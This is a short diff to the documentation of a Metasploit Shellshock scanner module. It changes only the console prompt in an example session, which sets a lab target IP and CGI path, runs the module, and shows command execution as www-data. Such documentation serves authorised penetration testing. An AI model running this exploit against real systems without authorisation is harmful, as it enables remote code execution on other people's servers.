@@ -95,12 +95,12 @@ This is HTTP method used by the module.  The default setting is `GET`.
 ### Ubuntu 12.04.5 LTS on Apache 2.2.22
 
   ```
-msf5 > use auxiliary/scanner/http/apache_mod_cgi_bash_env
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
+msf > use auxiliary/scanner/http/apache_mod_cgi_bash_env
+msf auxiliary(scanner/http/apache_mod_cgi_bash_env) > set RHOSTS 172.16.131.134
 RHOSTS => 172.16.131.134
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
+msf auxiliary(scanner/http/apache_mod_cgi_bash_env) > set TARGETURI /cgi-bin/test.sh
 TARGETURI => /cgi-bin/test.sh
-msf5 auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
+msf auxiliary(scanner/http/apache_mod_cgi_bash_env) > exploit
 
 [+] uid=33(www-data) gid=33(www-data) groups=33(www-data)
 [*] Scanned 1 of 1 hosts (100% complete)
